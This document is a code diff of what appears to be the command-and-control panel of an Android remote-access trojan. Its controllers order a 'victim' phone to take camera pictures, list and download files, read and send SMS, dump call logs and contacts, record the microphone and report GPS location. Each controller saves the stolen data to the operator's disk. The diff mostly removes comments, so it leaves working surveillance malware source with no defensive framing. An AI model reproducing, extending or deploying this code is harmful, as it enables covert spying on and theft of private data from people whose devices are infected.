@@ -48,8 +48,6 @@ app.config(function ($routeProvider) {
         });
 });
 
-
-
 //-----------------------LAB Controller (lab.htm)------------------------
 // controller for Lab.html and its views mic.html,camera.html..etc
 app.controller("LabCtrl", function ($scope, $rootScope, $location) {
@@ -70,7 +68,6 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
         }
     };
 
-
     $rootScope.Log = (msg, status) => {
         var fontColor = CONSTANTS.logColors.DEFAULT;
         if (status == CONSTANTS.logStatus.SUCCESS)
@@ -84,37 +81,18 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
             $labCtrl.$apply();
     }
 
-    //fired when notified from Main Proccess (main.js) about
-    // this victim who disconnected
     ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
         $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
     });
 
-
-    //fired when notified from the Main Process (main.js) about
-    // the Server disconnection
     ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
         $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
     });
 
-
-
-
-    // to move from view to another
     $labCtrl.goToPage = (page) => {
         $location.path('/' + page);
     }
-
-
-
-
-
 });
-
-
-
-
-
 
 //-----------------------Camera Controller (camera.htm)------------------------
 // camera controller
@@ -123,44 +101,32 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
     $camCtrl.isSaveShown = false;
     var camera = CONSTANTS.orders.camera;
 
-    // remove socket listner if the camera page is changed or destroied
     $camCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(camera);
     });
 
-
     $rootScope.Log('Get cameras list');
     $camCtrl.load = 'loading';
-    // send order to victim to bring camera list
     socket.emit(ORDER, { order: camera, extra: 'camList' });
 
-
-
-    // wait any response from victim
     socket.on(camera, (data) => {
-        if (data.camList == true) { // the rseponse is camera list
+        if (data.camList == true) {
             $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
             $camCtrl.cameras = data.list;
             $camCtrl.load = '';
             $camCtrl.selectedCam = $camCtrl.cameras[1];
             $camCtrl.$apply();
-        } else if (data.image == true) { // the rseponse is picture
-
+        } else if (data.image == true) {
             $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);
-
-            // convert binary to base64
             var uint8Arr = new Uint8Array(data.buffer);
             var binary = '';
             for (var i = 0; i < uint8Arr.length; i++) {
                 binary += String.fromCharCode(uint8Arr[i]);
             }
             var base64String = window.btoa(binary);
-
             $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
             $camCtrl.isSaveShown = true;
             $camCtrl.$apply();
-
             $camCtrl.savePhoto = () => {
                 $rootScope.Log('Saving picture..');
                 var picPath = path.join(downloadsPath, Date.now() + ".jpg");
@@ -169,30 +135,16 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
                         $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
                     else
                         $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);
-
                 });
-
             }
-
         }
     });
 
-
     $camCtrl.snap = () => {
-        // send snap request to victim
         $rootScope.Log('Snap a picture');
         socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
     }
-
-
-
-
 });
-
-
-
-
-
 
 //-----------------------File Controller (fileManager.htm)------------------------
 // File controller
@@ -202,39 +154,29 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     $fmCtrl.files = [];
     var fileManager = CONSTANTS.orders.fileManager;
 
-
-    // remove socket listner
     $fmCtrl.$on('$destroy', () => {
-        // release resources
         socket.removeAllListeners(fileManager);
     });
 
-    // limit the ng-repeat
-    // infinite scrolling
     $fmCtrl.barLimit = 30;
     $fmCtrl.increaseLimit = () => {
         $fmCtrl.barLimit += 30;
     }
 
-    // send request to victim to bring files
     $rootScope.Log('Get files list');
-    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
     socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });
 
     socket.on(fileManager, (data) => {
-        if (data.file == true) { // response with file's binary
+        if (data.file == true) {
             $rootScope.Log('Saving file..');
             var filePath = path.join(downloadsPath, data.name);
-
-            // function to save the file to my local disk
             fs.outputFile(filePath, data.buffer, (err) => {
                 if (err)
                     $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                 else
                     $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
             });
-
-        } else if (data.length != 0) { // response with files list
+        } else if (data.length != 0) {
             $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
             $fmCtrl.load = '';
             $fmCtrl.files = data;
@@ -244,11 +186,8 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
             $fmCtrl.load = '';
             $fmCtrl.$apply();
         }
-
     });
 
-
-    // when foder is clicked
     $fmCtrl.getFiles = (file) => {
         if (file != null) {
             $fmCtrl.load = 'loading';
@@ -257,20 +196,11 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         }
     };
 
-    // when save button is clicked
-    // send request to bring file's' binary
     $fmCtrl.saveFile = (file) => {
         $rootScope.Log('Downloading ' + '/' + file);
         socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
     }
-
 });
-
-
-
-
-
-
 
 //-----------------------SMS Controller (sms.htm)------------------------
 // SMS controller
@@ -282,12 +212,9 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
         .tab();
 
     $SMSCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(sms);
     });
 
-
-    // send request to victim to bring all sms
     $SMSCtrl.getSMSList = () => {
         $SMSCtrl.load = 'loading';
         $SMSCtrl.barLimit = 50;
@@ -299,24 +226,18 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
         $SMSCtrl.barLimit += 50;
     }
 
-    // send request to victim to send sms
     $SMSCtrl.SendSMS = (phoneNo, msg) => {
         $rootScope.Log('Sending SMS..');
         socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
     }
 
-    // save sms list to csv file
     $SMSCtrl.SaveSMS = () => {
-
         if ($SMSCtrl.smsList.length == 0)
             return;
-
-
         var csvRows = [];
         for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
             csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
         }
-
         var csvStr = csvRows.join("\n");
         var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
         $rootScope.Log("Saving SMS List...");
@@ -325,13 +246,9 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
                 $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
             else
                 $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
-
         });
-
     }
 
-
-    //listening for victim response
     socket.on(sms, (data) => {
         if (data.smsList) {
             $SMSCtrl.load = '';
@@ -346,19 +263,7 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
                 $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
         }
     });
-
-
-
 });
-
-
-
-
-
-
-
-
-
 
 //-----------------------Calls Controller (callslogs.htm)------------------------
 // Calls controller
@@ -368,7 +273,6 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
     var calls = CONSTANTS.orders.calls;
 
     $CallsCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(calls);
     });
 
@@ -376,24 +280,20 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
     $rootScope.Log('Get Calls list..');
     socket.emit(ORDER, { order: calls });
 
-
     $CallsCtrl.barLimit = 50;
     $CallsCtrl.increaseLimit = () => {
         $CallsCtrl.barLimit += 50;
     }
 
-
     $CallsCtrl.SaveCalls = () => {
         if ($CallsCtrl.callsList.length == 0)
             return;
-
         var csvRows = [];
         for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
             var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
             var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
             csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
         }
-
         var csvStr = csvRows.join("\n");
         var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
         $rootScope.Log("Saving Calls List...");
@@ -402,9 +302,7 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
                 $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
             else
                 $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
-
         });
-
     }
 
     socket.on(calls, (data) => {
@@ -416,14 +314,7 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
             $CallsCtrl.$apply();
         }
     });
-
-
-
 });
-
-
-
-
 
 //-----------------------Contacts Controller (contacts.htm)------------------------
 // Contacts controller
@@ -433,7 +324,6 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
     var contacts = CONSTANTS.orders.contacts;
 
     $ContCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(contacts);
     });
 
@@ -447,15 +337,12 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
     }
 
     $ContCtrl.SaveContacts = () => {
-
         if ($ContCtrl.contactsList.length == 0)
             return;
-
         var csvRows = [];
         for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
             csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
         }
-
         var csvStr = csvRows.join("\n");
         var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
         $rootScope.Log("Saving Contacts List...");
@@ -464,9 +351,7 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
                 $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
             else
                 $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
-
         });
-
     }
 
     socket.on(contacts, (data) => {
@@ -478,15 +363,7 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
             $ContCtrl.$apply();
         }
     });
-
-
-
-
-
 });
-
-
-
 
 //-----------------------Mic Controller (mic.htm)------------------------
 // Mic controller
@@ -496,28 +373,22 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
     var mic = CONSTANTS.orders.mic;
 
     $MicCtrl.$on('$destroy', function () {
-        // release resources, cancel Listner...
         socket.removeAllListeners(mic);
     });
 
     $MicCtrl.Record = (seconds) => {
-
         if (seconds) {
             if (seconds > 0) {
                 $rootScope.Log('Recording ' + seconds + "'s...");
                 socket.emit(ORDER, { order: mic, sec: seconds });
             } else
                 $rootScope.Log('Seconds must be more than 0');
-
         }
-
     }
-
 
     socket.on(mic, (data) => {
         if (data.file == true) {
             $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);
-
             var player = document.getElementById('player');
             var sourceMp3 = document.getElementById('sourceMp3');
             var uint8Arr = new Uint8Array(data.buffer);
@@ -526,7 +397,6 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
                 binary += String.fromCharCode(uint8Arr[i]);
             }
             var base64String = window.btoa(binary);
-
             $MicCtrl.isAudio = false;
             $MicCtrl.$apply();
             sourceMp3.src = "data:audio/mp3;base64," + base64String;
@@ -542,20 +412,10 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
                     else
                         $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                 });
-
-
             };
-
-
-
         }
-
     });
 });
-
-
-
-
 
 //-----------------------Location Controller (location.htm)------------------------
 // Location controller
@@ -564,28 +424,21 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
     var location = CONSTANTS.orders.location;
 
     $LocCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(location);
     });
-
 
     var map = L.map('mapid').setView([51.505, -0.09], 13);
     L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);
 
     $LocCtrl.Refresh = () => {
-
         $LocCtrl.load = 'loading';
         $rootScope.Log('Get Location..');
         socket.emit(ORDER, { order: location });
-
     }
-
-
 
     $LocCtrl.load = 'loading';
     $rootScope.Log('Get Location..');
     socket.emit(ORDER, { order: location });
-
 
     var marker;
     socket.on(location, (data) => {
@@ -600,12 +453,9 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
                     var marker = L.marker(victimLoc).addTo(map);
                 else
                     marker.setLatLng(victimLoc).update();
-
                 map.panTo(victimLoc);
             }
         } else
             $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
-
     });
-
 });
